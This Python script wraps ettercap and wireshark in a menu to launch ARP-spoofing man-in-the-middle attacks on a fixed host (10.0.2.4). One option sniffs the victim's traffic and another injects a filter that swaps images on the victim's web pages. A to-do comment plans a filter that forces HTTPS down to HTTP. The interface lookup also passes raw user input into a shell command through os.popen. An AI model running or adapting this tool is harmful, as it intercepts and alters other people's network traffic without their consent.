#!/usr/bin/python
import os
import subprocess
import time

# ToDo:
#	add default interface eth0 if selected is empty or not existend
#	add default ip address and check given address for correct format
#	add filter to redirect from https to http
#	change filter catFilter to replace all images ==> regex
#	give the possibility to change the image source
#	start wireshark with activated filter

subprocess.call(["ifconfig"])
interface = raw_input("Select Interface: ")

interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
ipAddress = interfaceData.read()


#subprocess.call(["wireshark", "-i", interface])
#os.spawnl(os.P_NOWAIT, "/usr/bin/", "wireshark")

# Starts a normal MITM attack and sniffes the network traffic of the attacked host.
def ettercapMITM():
	print("Starting wireshark")
	# Start wireshark on selected interface and automatically start sniffing
	wiresharkRunning = subprocess.Popen(["wireshark", "-i", interface, "-k"])
	if(wiresharkRunning):
#		print("Waiting for wireshark")
#		time.sleep(5)
		print("Wireshark started")
		raw_input("Press Enter to start MITM")
		# Start ettercap on given interface and ip address and start MITM attack
		subprocess.call(["ettercap", "-T", "-i", interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])

# Replaces all images of websites on the attacked host
def ettercapFun():
	filter = "/usr/share/ettercap/catFilter.ef"
	subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])	

##########################################
# Show Menu
#########################################
showMenu = True
#while(showMenu):
while(showMenu):
	print("1.\tStart Ettercap in sniffing mode")
	print("2.\tStart Ettercap in fun mode")
	print("0.\tExit")
	selection = input("Your selection: ")
	if(selection == 1):
		ettercapMITM()
	elif(selection == 2):
		ettercapFun()
	elif(selection == 0):
		print("Exiting")
		showMenu = False
		
